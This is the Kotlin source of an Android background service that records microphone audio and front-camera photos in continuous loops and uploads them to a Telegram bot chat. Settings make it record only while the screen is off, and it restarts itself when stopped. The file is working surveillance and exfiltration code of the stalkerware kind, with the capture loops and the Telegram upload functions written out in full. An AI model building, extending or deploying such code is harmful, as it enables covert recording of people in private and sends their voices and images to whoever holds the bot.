package com.example.telegramsender

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.core.ImageProxy
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleOwner
import androidx.lifecycle.LifecycleRegistry
import kotlinx.coroutines.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.ByteArrayOutputStream
import java.io.IOException

class MonitorService : Service(), LifecycleOwner {

    private val client = OkHttpClient.Builder()
        .connectTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
        .writeTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
        .readTimeout(60, java.util.concurrent.TimeUnit.SECONDS)
        .build()
        
    private val lifecycleRegistry = LifecycleRegistry(this)
    private var job: Job? = null
    
    // Credentials & Config
    private var botToken: String = ""
    private var targetChatId: String = ""
    private var sendAudio: Boolean = false
    private var audioDuration: Long = 60000L
    private var audioScreenOff: Boolean = false
    private var sendCamera: Boolean = false
    private var cameraScreenOff: Boolean = false
    private var captureInterval: Long = 10000L 

    private var mediaRecorder: android.media.MediaRecorder? = null
    override fun onCreate() {
        super.onCreate()
        lifecycleRegistry.currentState = Lifecycle.State.CREATED
        startForegroundServiceNotification()
        loadCredentials()
        startLoops()
    }

    // ... (onStartCommand matches) ...
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        lifecycleRegistry.currentState = Lifecycle.State.STARTED
        startForegroundServiceNotification()
        loadCredentials()
        startLoops()
        // If credentials valid, send "Monitor Service Started" msg?
        return START_STICKY
    }
    
    private fun loadCredentials() {
        val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
        botToken = pref.getString("token", "") ?: ""
        targetChatId = pref.getString("chatId", "") ?: ""
        sendCamera = pref.getBoolean("sendCamera", false)
        sendAudio = pref.getBoolean("sendAudio", false)
        
        val camSec = pref.getLong("cameraInterval", 10L) 
        captureInterval = camSec * 1000L
        if (captureInterval < 5000L) captureInterval = 5000L
        
        audioDuration = pref.getLong("audioDuration", 60L) * 1000L
        if (audioDuration < 5000L) audioDuration = 5000L
        audioScreenOff = pref.getBoolean("audioScreenOff", false)
        cameraScreenOff = pref.getBoolean("cameraScreenOff", false)
    }
    
    private fun startLoops() {
        job?.cancel()
        job = CoroutineScope(Dispatchers.IO).launch {
            // Audio Loop
            launch {
                while (isActive) {
                    loadCredentials() // Reload to catch config changes
                    if (botToken.isNotEmpty() && targetChatId.isNotEmpty() && sendAudio) {
                         val shouldRecord = if (audioScreenOff) !isScreenOn() else true
                         if (shouldRecord) {
                             recordAndSendAudio()
                         } else {
                             delay(5000)
                         }
                    } else {
                        delay(5000)
                    }
                }
            }
            
            // Camera Loop (Independent of Screenshot)
            launch {
                 while (isActive) {
                     loadCredentials()
                     if (botToken.isNotEmpty() && targetChatId.isNotEmpty() && sendCamera) {
                         val shouldCapture = if (cameraScreenOff) !isScreenOn() else true
                         if (shouldCapture) {
                             captureCameraAndSend()
                         }
                     }
                     delay(captureInterval)
                 }
            }
        }
    }

    private fun isScreenOn(): Boolean {
        val powerManager = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        return powerManager.isInteractive
    }
    
    private suspend fun recordAndSendAudio() {
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            Log.e("MonitorService", "Permission RECORD_AUDIO denied")
            return
        }
        
        // Ensure Mic is free
        delay(1000)

        // Use .m4a for high quality AAC
        val dateFormat = java.text.SimpleDateFormat("yyyy-MM-dd_HH-mm-ss", java.util.Locale.getDefault())
        val timestamp = dateFormat.format(java.util.Date())
        val audioFile = java.io.File(cacheDir, "audio_$timestamp.m4a")
        
        // Local variable for thread safety within this suspension
        var mr: android.media.MediaRecorder? = null
        
        try {
            mr = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                android.media.MediaRecorder(this)
            } else {
                android.media.MediaRecorder()
            }
            
            mr.apply {
                setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
                // Switch to High Quality AAC
                setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
                setAudioEncodingBitRate(128000) // 128 kbps
                setAudioSamplingRate(44100)     // 44.1 kHz
                setOutputFile(audioFile.absolutePath)
                prepare()
                start()
            }
            
            Log.d("MonitorService", "Recording Audio for $audioDuration ms")
            
            // Record
            delay(audioDuration)
            
            try { 
                mr.stop() 
            } catch(e: RuntimeException) {
                Log.w("MonitorService", "Recorder stop failed", e)
            }
            
            // Critical release before network
            mr.release()
            mr = null
            
            // Send
            if (audioFile.exists() && audioFile.length() > 0) {
                 sendTelegramAudio(botToken, targetChatId, audioFile)
                 audioFile.delete()
            }
            
        } catch (e: Exception) {
            Log.e("MonitorService", "Audio Record Fatal Error", e)
            if (audioFile.exists()) audioFile.delete()
            delay(10000) // Cool down on error
        } finally {
            try { mr?.release() } catch (e: Exception) {}
        }
    }
    
    private suspend fun captureCameraAndSend() {
        withContext(Dispatchers.Main) {
            try {
                // ... CameraX Logic ...
                 val cameraProviderFuture = ProcessCameraProvider.getInstance(this@MonitorService)
                 cameraProviderFuture.addListener({
                    val cameraProvider = cameraProviderFuture.get()
                    val imageCapture = ImageCapture.Builder().setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY).build()
                    val cameraSelector = CameraSelector.DEFAULT_FRONT_CAMERA
                    
                    try {
                        cameraProvider.unbindAll()
                        cameraProvider.bindToLifecycle(this@MonitorService, cameraSelector, imageCapture)
                        
                        imageCapture.takePicture(ContextCompat.getMainExecutor(this@MonitorService), object : ImageCapture.OnImageCapturedCallback() {
                            override fun onCaptureSuccess(image: ImageProxy) {
                                val bitmap = imageProxyToBitmap(image)
                                image.close()
                                if (bitmap != null) {
                                    CoroutineScope(Dispatchers.IO).launch {
                                         sendTelegramPhoto(botToken, targetChatId, bitmap, "camera.jpg")
                                    }
                                }
                                cameraProvider.unbindAll() // Release immediately
                            }
                            override fun onError(exception: ImageCaptureException) {
                                cameraProvider.unbindAll()
                            }
                        })
                    } catch(e:Exception) {}
                 }, ContextCompat.getMainExecutor(this@MonitorService))
            } catch (e: Exception) {}
        }
    }
    
    private fun imageProxyToBitmap(image: ImageProxy): Bitmap? {
        val buffer = image.planes[0].buffer
        val bytes = ByteArray(buffer.remaining())
        buffer.get(bytes)
        return BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
    }

    private fun sendTelegramAudio(token: String, chatId: String, file: java.io.File) {
        val url = "https://api.telegram.org/bot$token/sendAudio"
        try {
             val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("audio", file.name,
                    file.readBytes().toRequestBody("audio/m4a".toMediaTypeOrNull(), 0, file.length().toInt()))
                .build()
            val request = Request.Builder().url(url).post(requestBody).build()
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) {
                    Log.e("MonitorService", "Failed to send audio: ${response.code} ${response.message}")
                } else {
                    Log.d("MonitorService", "Audio sent successfully")
                }
            }
        } catch (e: Exception) { Log.e("MonitorService", "Send Audio Failed", e) }
    }
    
    private fun sendTelegramPhoto(token: String, chatId: String, originalBitmap: Bitmap, filename: String) {
         // ... Reusing logic from TelegramService, simplified ...
         // (Ideally should be in a Shared Helper, but duplicating for safety now to avoid extensive refactor)
        val url = "https://api.telegram.org/bot$token/sendPhoto"
        val stream = ByteArrayOutputStream()
        originalBitmap.compress(Bitmap.CompressFormat.JPEG, 60, stream)
        val byteArray = stream.toByteArray()
        originalBitmap.recycle() // Important!
        
        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", chatId)
            .addFormDataPart("photo", filename,
                byteArray.toRequestBody("image/jpeg".toMediaTypeOrNull(), 0, byteArray.size))
            .build()
        val request = Request.Builder().url(url).post(requestBody).build()
        try { client.newCall(request).execute().use { } } catch(e: Exception) {}
    }

    private fun startForegroundServiceNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel("MonitorServiceChannel", "Monitor Service", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
        val notification = NotificationCompat.Builder(this, "MonitorServiceChannel")
            .setContentTitle("Monitor Service")
            .setContentText("Audio/Camera Active")
            .setSmallIcon(R.mipmap.ic_launcher)
            .build()
            
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(2, notification, 
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or 
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
        } else {
            startForeground(2, notification)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        job?.cancel()
        mediaRecorder?.release()
        lifecycleRegistry.currentState = Lifecycle.State.DESTROYED
    }

    override fun onBind(intent: Intent?): IBinder? = null
    
    override val lifecycle: Lifecycle
        get() = lifecycleRegistry
}
